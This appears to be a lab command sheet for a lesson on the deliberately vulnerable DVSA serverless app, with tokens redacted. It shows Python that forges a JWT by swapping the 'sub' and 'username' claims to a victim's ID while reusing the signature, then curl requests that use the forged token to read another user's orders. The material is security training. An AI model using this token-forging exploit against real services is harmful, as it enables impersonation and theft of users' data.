# Lesson 02 Commands

Tokens are redacted here. Use fresh tokens when re-running.

```bash
export API="https://olw47gvbv9.execute-api.us-east-1.amazonaws.com/dvsa/order"
export TOKEN_B="REDACTED"
export TOKEN_C="REDACTED"
```

Decode token identities:

```bash
python3 - <<'PY'
import os, json, base64

def decode(token):
    payload = token.split(".")[1]
    payload += "=" * (-len(payload) % 4)
    return json.loads(base64.urlsafe_b64decode(payload.encode()))

for name in ["TOKEN_B", "TOKEN_C"]:
    data = decode(os.environ[name])
    print("\n" + name)
    print("username:", data.get("username"))
    print("sub     :", data.get("sub"))
PY
```

Forge User B token as User C:

```bash
export VICTIM_USER="b46884b8-e021-7062-41f7-8c470a17a758"

export FAKE_AS_C="$(
python3 - <<'PY'
import os, json, base64

t = os.environ["TOKEN_B"]
victim = os.environ["VICTIM_USER"]
h, p, s = t.split(".")
p += "=" * (-len(p) % 4)
data = json.loads(base64.urlsafe_b64decode(p.encode()))
data["username"] = victim
data["sub"] = victim
newp = base64.urlsafe_b64encode(json.dumps(data, separators=(",", ":")).encode()).rstrip(b"=").decode()
print(f"{h}.{newp}.{s}")
PY
)"
```

Baseline, exploit, and post-fix verification:

```bash
curl -s "$API" -H "content-type: application/json" -H "authorization:$TOKEN_B" --data-raw '{"action":"orders"}' | jq
curl -s "$API" -H "content-type: application/json" -H "authorization:$FAKE_AS_C" --data-raw '{"action":"orders"}' | jq
```
